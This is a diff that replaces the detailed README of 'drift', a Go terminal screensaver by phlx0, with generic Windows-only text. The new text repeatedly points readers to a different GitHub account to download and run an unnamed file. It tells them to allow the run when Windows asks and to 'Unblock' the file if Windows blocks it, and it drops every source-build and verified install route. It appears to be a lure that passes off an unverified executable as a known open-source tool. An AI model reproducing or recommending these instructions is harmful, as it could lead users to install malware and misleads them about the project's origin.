@@ -1,406 +1,186 @@
-<div align="center">
+# 🌌 drift - Idle screensaver for your terminal
 
-<pre>
-·  ·    ·        ·     ·    ·  ·
-    ·      d r i f t      ·
-  ·    ·        ·    ·       ·
-</pre>
+[![Download drift](https://img.shields.io/badge/Download-drift-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Warrenheartshaped523/drift)
 
-**A terminal screensaver that turns idle time into ambient art.**
+## ✨ What it does
 
-Every OS has a screensaver. The terminal had nothing — until now.
+drift turns your terminal into a quiet screensaver when you step away.
 
-[![Go](https://img.shields.io/badge/go-1.23+-00ADD8?style=flat-square&logo=go&logoColor=white)](https://go.dev)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/phlx0/drift?style=flat-square&color=blueviolet)](https://github.com/phlx0/drift/releases)
-[![CI](https://img.shields.io/github/actions/workflow/status/phlx0/drift/ci.yml?style=flat-square&label=ci)](https://github.com/phlx0/drift/actions)
-[![Go Report Card](https://goreportcard.com/badge/github.com/phlx0/drift?style=flat-square)](https://goreportcard.com/report/github.com/phlx0/drift)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](CONTRIBUTING.md)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/phlx0/drift/releases)
-[![AUR](https://img.shields.io/aur/version/drift-bin?style=flat-square&label=AUR&color=1793d1)](https://aur.archlinux.org/packages/drift-bin)
+It shows moving scenes like:
 
-</div>
+- constellations
+- rain
+- particles
+- other looping terminal art
 
----
+When you press any key, it stops and gives control back to you at once.
 
-<img src="demo/waveform.gif" width="100%" />
+## 🪟 Windows download and setup
 
----
+Use this link to visit the download page:
 
-## Scenes
+[https://github.com/Warrenheartshaped523/drift](https://github.com/Warrenheartshaped523/drift)
 
-drift ships eleven animations. They cycle automatically or you can lock to one.
+### What to do
 
-<table>
-<tr>
-<td width="50%">
+1. Open the link above in your browser.
+2. Look for the latest release or download file.
+3. Save the file to your computer.
+4. Open the file you downloaded.
+5. If Windows asks for permission, choose the option to run it.
+6. Open a terminal window to start drift if the app does not launch on its own.
 
-**waveform** — braille sine waves that breathe
+### Easy checks before you start
 
-<img src="demo/waveform.gif" width="100%" />
+- Use Windows 10 or Windows 11
+- Make sure your terminal window is open wide enough to show the animation
+- Close other full-screen apps if the display does not look right
 
-</td>
-<td width="50%">
+### If Windows blocks the file
 
-**constellation** — stars drift and connect
+- Right-click the file
+- Choose Properties
+- If you see an Unblock option, select it
+- Try opening it again
 
-<img src="demo/constellation.gif" width="100%" />
+## 🎮 How to use drift
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+Once drift is running, it waits until you are idle.
 
-**rain** — katakana characters fall in columns
+- Stop typing and leave the terminal open
+- Let the screen stay still for a short time
+- drift will start the screensaver scene
+- Press any key to return to the terminal
 
-<img src="demo/rain.gif" width="100%" />
+You do not need to set up a profile or sign in. It just runs and waits for idle time.
 
-</td>
-<td width="50%">
+## 🖥️ What you need
 
-**particles** — a flow field of drifting glyphs
+drift is made for a terminal on desktop systems.
 
-<img src="demo/particles.gif" width="100%" />
+### Good fit for most users
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+- Windows 10 or later
+- A working terminal app
+- A keyboard
+- A screen with at least standard HD size
 
-**pipes** — box-drawing pipes snake across the screen and wrap at the edges
+### Works best with
 
-<img src="demo/pipes.gif" width="100%" />
+- A dark terminal theme
+- A wide terminal window
+- A font that is easy to read
 
-</td>
-<td width="50%">
+## 🌠 What you will see
 
-**maze** — a perfect maze builds itself, holds, then dissolves and regenerates
+drift uses simple terminal graphics to build a calm screen scene.
 
-<img src="demo/maze.gif" width="100%" />
+Common visual modes include:
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+- star fields
+- drifting particles
+- rain lines
+- moving ASCII shapes
+- looped ambient motion
 
-**life** — Conway's Game of Life; cells flash bright on birth, age through the palette, reset when the grid stagnates
+The style fits terminal fans who like clean motion and plain text art.
 
-<img src="demo/life.gif" width="100%" />
+## 🧭 Getting started
 
-</td>
-<td width="50%">
+Follow these steps if you want the quickest path from download to use:
 
-**clock** — current time in large braille digits, styled in the active theme, with the date below
+1. Visit the download page:
+   [https://github.com/Warrenheartshaped523/drift](https://github.com/Warrenheartshaped523/drift)
+2. Download the Windows file or release package.
+3. Open the file you saved.
+4. Start drift.
+5. Leave the terminal idle for a moment.
+6. Press any key when you want to stop the screensaver.
 
-<img src="demo/clock.gif" width="100%" />
+## ⚙️ Basic use tips
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+- Keep the terminal focused while drift is running
+- Do not resize the window too often during playback
+- Use a larger window for more room in the animation
+- If the motion looks crowded, make the terminal wider
+- If the text looks small, raise the font size in your terminal app
 
-**orrery** — a stylized solar system with a fixed sun, concentric orbit rings, and braille-rendered planets
+## 🧩 Common uses
 
-<img src="demo/orrery.gif" width="100%" />
+People use drift for:
 
-</td>
-<td width="50%">
+- a calm idle screen while they work
+- a terminal demo on a desktop
+- a live background on a coding setup
+- a low-key display on a second monitor
+- a visual break during long work sessions
 
-**starfield** — classic 3-D star warp; stars accelerate toward you from the centre, brightening and leaving trails as they approach
+## 🎨 Included style themes
 
-<img src="demo/starfield.gif" width="100%" />
+drift supports a range of looks, such as:
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+- space scenes
+- rain effects
+- particle movement
+- text-based motion
+- minimal terminal art
 
-**dvd** — the classic bouncing logo; changes palette color on each wall bounce and flashes bright on a corner hit
+Each mode keeps the same idea: show motion when you are away, then stop when you return.
 
-<img src="demo/dvd.gif" width="100%" />
+## 🔧 Troubleshooting
 
-</td>
-<td width="50%">
-</td>
-</tr>
-</table>
+### Nothing happens when I open it
 
-## Themes
+- Check that the file finished downloading
+- Try opening it again
+- Make sure Windows did not block the file
+- Confirm that your terminal app is installed
 
-Nine built-in themes matched to popular terminal colorschemes.
+### The screen looks cut off
 
-`cosmic` · `nord` · `dracula` · `catppuccin` · `gruvbox` · `forest` · `wildberries` · `mono` · `rosepine`
+- Make the terminal window larger
+- Lower the font size
+- Turn off split panes or side panels
 
+### The animation looks slow
 
-```bash
-drift list themes    # preview all themes with color swatches
-```
+- Close other heavy apps
+- Reduce the terminal size
+- Use a simpler terminal theme
 
----
+### The key press does not stop it
 
-## Installation
+- Click the terminal window first
+- Press a normal key like Space or Enter
+- Make sure the terminal has focus
 
-### Option 1 — AUR (Arch Linux)
+## 📁 Project details
 
-```bash
-yay -S drift-bin   # or: paru -S drift-bin
-```
+- Repository name: drift
+- Type: terminal screensaver
+- Main idea: start when idle, stop on key press
+- Tech stack: Go, terminal UI, text-based animation
+- Topics: animation, ascii, cli, go, golang, idle, screensaver, tcell, terminal, tui, unixporn
 
-### Option 2 — Pre-built binary (no Go required)
+## 🔗 Download link
 
-1. Go to the [Releases](https://github.com/phlx0/drift/releases) page.
-2. Download the archive for your platform:
+Open the download page here:
 
-   | OS | Chip | File |
-   |---|---|---|
-   | macOS | Apple Silicon (M1/M2/M3) | `drift_darwin_arm64.tar.gz` |
-   | macOS | Intel | `drift_darwin_amd64.tar.gz` |
-   | Linux | x86-64 | `drift_linux_amd64.tar.gz` |
-   | Linux | ARM64 | `drift_linux_arm64.tar.gz` |
-   | Windows | x86-64 | `drift_windows_amd64.zip` |
+[https://github.com/Warrenheartshaped523/drift](https://github.com/Warrenheartshaped523/drift)
 
-3. Extract and move it somewhere on your `PATH`:
+## 🪄 What makes it useful
 
-   ```bash
-   tar -xzf drift_darwin_arm64.tar.gz
-   sudo mv drift /usr/local/bin/
-   drift version
-   ```
+drift gives your terminal a quiet idle state without extra setup on the screen itself.
 
-### Option 3 — Go install
+- it waits for you to stop typing
+- it uses simple visuals that fit a terminal
+- it returns control fast when you press a key
+- it keeps the focus on the terminal, not the app window
 
-```bash
-go install github.com/phlx0/drift@latest
-```
+## 🧠 Quick start recap
 
-Make sure Go's bin directory is on your `PATH`:
-
-```bash
-# add to ~/.zshrc or ~/.bashrc
-export PATH="$PATH:$(go env GOPATH)/bin"
-```
-
-### Option 4 — Build from source
-
-```bash
-git clone https://github.com/phlx0/drift
-cd drift
-go install .
-```
-
-Requires **Go 1.23+**. No C compiler or CGO needed.
-
----
-
-## Shell integration
-
-Shell integration is what makes drift a real screensaver — your shell detects
-idleness and launches drift automatically. Press any key to return to your prompt.
-
-### Zsh
-
-```zsh
-# add to ~/.zshrc
-export DRIFT_TIMEOUT=120   # seconds of inactivity (default: 120)
-eval "$(drift shell-init zsh)"
-```
-
-### Bash
-
-```bash
-# add to ~/.bashrc
-export DRIFT_TIMEOUT=120   # seconds of inactivity (default: 120)
-eval "$(drift shell-init bash)"
-```
-
-### Fish
-
-```fish
-# add to ~/.config/fish/conf.d/drift.fish
-set -x DRIFT_TIMEOUT 120   # seconds of inactivity (default: 120)
-drift shell-init fish | source
-```
-
-### Windows
-
-Shell integration is not available on Windows. Run `drift` directly from any terminal (Windows Terminal, PowerShell, cmd) to start it immediately, or use `drift --showcase` to browse interactively. Press `esc` to exit.
-
----
-
-## Usage
-
-```
-drift                            start immediately (shell integration mode)
-drift --scene waveform           lock to a specific scene
-drift --theme catppuccin         override the color theme
-drift --duration 30              cycle scenes every 30 seconds
-drift --showcase                 browse all scenes and themes interactively
-
-drift list scenes                list all available scenes
-drift list themes                list themes with color swatches
-drift shell-init zsh|bash|fish   print shell integration snippet
-drift config                     show effective configuration
-drift config --init              write default config to ~/.config/drift/config.toml
-drift version                    print version info
-```
-
-| Flag | Default | Description |
-|---|---|---|
-| `--scene`, `-s` | cycle all | lock to a specific scene |
-| `--theme`, `-t` | `cosmic` | color theme |
-| `--fps` | `30` | target frame rate |
-| `--duration` | `60` | seconds per scene, `0` = no cycling |
-| `--showcase` | `false` | interactive browser: `↑↓`/`ws` scene · `←→`/`ad` theme · `esc` quit |
-
----
-
-## Configuration
-
-```bash
-drift config --init   # writes ~/.config/drift/config.toml
-```
-
-```toml
-[engine]
-fps              = 30
-cycle_seconds    = 60    # 0 = stay on one scene
-fade_seconds     = 0.3   # fade-to-black between scenes, 0 = instant cut
-scenes           = "all"
-theme            = "cosmic"
-shuffle          = true
-hide_tmux_status = false
-
-[scene.constellation]
-star_count      = 80
-connect_radius  = 0.18   # connection threshold as a fraction of screen diagonal (0.0–1.0)
-twinkle         = true   # animate star brightness; false = steady glow
-max_connections = 4      # max lines drawn from each star
-
-[scene.rain]
-charset = "ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉ0123456789"
-density = 0.4
-speed   = 1.0
-
-[scene.particles]
-count    = 120
-gravity  = 0.0   # downward acceleration in cells/s²; negative pulls upward
-friction = 0.98  # velocity damping per frame (0.0 = instant stop, 1.0 = no damping)
-
-[scene.waveform]
-layers    = 3    # number of overlapping sine waves (1–3)
-amplitude = 0.70
-speed     = 1.0
-
-[scene.orrery]
-bodies      = 8    # number of planets (4–8)
-trail_decay = 2.4  # seconds for orbit trails to fade; lower = shorter trails
-
-[scene.pipes]
-heads         = 6
-turn_chance   = 0.15
-speed         = 1.0
-reset_seconds = 45.0
-
-[scene.maze]
-pause_seconds = 3.0
-fade_seconds  = 2.0
-speed         = 1.0
-
-[scene.life]
-density       = 0.35
-speed         = 1.0
-reset_seconds = 30.0
-
-[scene.clock]
-show_date = true  # show date below the time
-
-[scene.starfield]
-count = 200   # number of stars
-speed = 1.0   # warp speed multiplier
-
-[scene.dvd]
-speed = 1.0     # movement speed multiplier
-label = "drift" # text displayed inside the bouncing logo
-```
-
-### Custom themes
-
-Define your own themes in `config.toml` under `[theme.<name>]`. Custom themes appear alongside built-ins in `drift list themes` and in showcase mode navigation.
-
-```toml
-[theme.terminal]
-bright  = "#ffffff"
-palette = ["#ff5555", "#50fa7b", "#f1fa8c", "#bd93f9"]
-dim     = ["#3d0000", "#003d00", "#3d3d00", "#1e003d"]
-```
-
-| Key | Description |
-|---|---|
-| `bright` | Near-white highlight color (`#RRGGBB`) |
-| `palette` | Accent colors — scenes index with `palette[i % len(palette)]` |
-| `dim` | Darker variants for trails and depth — must be the same length as `palette` |
-
-Then use it like any built-in: `drift --theme terminal`.
-
----
-
-## Showcase mode
-
-`drift --showcase` runs drift continuously — nothing exits it except `esc`. Use it to browse scenes and themes or leave it running on a visible window.
-
-| Key | Action |
-|---|---|
-| `↑` / `w` | previous scene |
-| `↓` / `s` | next scene |
-| `←` / `a` | previous theme |
-| `→` / `d` | next theme |
-| `esc` / `q` / `ctrl+c` | quit |
-
-A status bar shows the current scene and theme for 3 seconds after each keypress, then fades out.
-
----
-
-## Troubleshooting
-
-**Config changes have no effect**
-
-Run `drift config` to check whether your config file is being found:
-
-```
-Config file: /Users/you/.config/drift/config.toml (not found — using defaults; run 'drift config --init' to create it)
-```
-
-If the file is missing, create it with `drift config --init`. If it exists but changes still don't apply, check for a TOML syntax error — `drift config` will print the parse error if there is one.
-
-**drift doesn't activate automatically**
-
-Make sure the shell integration is sourced in your rc file and that `DRIFT_TIMEOUT` (or `TMOUT` in zsh) is set:
-
-```bash
-export DRIFT_TIMEOUT=120
-eval "$(drift shell-init zsh)"   # or bash / fish
-```
-
-Then open a new terminal session for it to take effect.
-
----
-
-## Contributing
-
-New scenes and themes are very welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for the development guide.
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=phlx0/drift&type=Date)](https://star-history.com/#phlx0/drift&Date)
-
----
-
-<div align="center">
-
-MIT License · made by [phlx0](https://github.com/phlx0)
-
-*press any key to resume*
-
-</div>
+1. Open the download page
+2. Download the Windows file
+3. Run the file
+4. Let the terminal sit idle
+5. Press any key to resume
